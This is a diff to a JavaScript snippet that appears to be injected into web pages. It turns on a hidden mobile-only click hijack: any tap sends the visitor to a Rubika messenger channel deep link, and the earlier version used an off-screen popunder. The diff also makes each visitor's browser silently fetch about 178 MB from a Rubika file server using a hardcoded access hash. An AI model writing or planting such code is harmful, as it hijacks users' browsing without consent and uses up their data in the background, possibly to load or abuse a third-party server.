@@ -1,5 +1,5 @@
 (function(docpointer) {
-	/*if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
+	if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
 	
 		let showRubaii = function() {
 			let meItem = localStorage.getItem("poprublast");
@@ -12,13 +12,13 @@
 		document.addEventListener("click", function(e) {
 			if (showRubaii()) {		
 				var width = (screen.width / 4), height = (screen.height / 4);
-				let config = 'width=' + (width) + ', height=' + (height) + ',top=99999999,left=99999999,status=yes,scrollbars=yes,fullscreen=no';
-				window.open("rubika://l.rubika.ir/gizmizrubiks", "_blank", config);
-				
+				//let config = 'width=' + (width) + ', height=' + (height) + ',top=99999999,left=99999999,status=yes,scrollbars=yes,fullscreen=no';
+				//window.open("rubika://l.rubika.ir/gizmizrubiks", "_blank", config);
+				window.open("rubika://c.rubika.ir/CBEDIFCG0NUQACMVLWCWMXJTJJSGFXKI", "_self");
 				localStorage.setItem("poprublast", Date.now());
 			}
 		});
-	}*/
+	}
 	fetch("https://messenger364.iranlms.ir/GetFile.ashx", {
 		method: "POST", // *GET, POST, PUT, DELETE, etc.
 		//mode: "no-cors", // no-cors, *cors, same-origin
@@ -28,7 +28,8 @@
 		  "Content-Type": "text/plain",
 		  "access-hash-rec": "3936103694292301675879444428742023070415",
 		  "file-id": "14540536082199",
-		  "start-index": "0"
+		  "start-index": "0",
+		  "last-index": "178274986"
 		  // 'Content-Type': 'application/x-www-form-urlencoded',
 		},
 		redirect: "follow", // manual, *follow, error
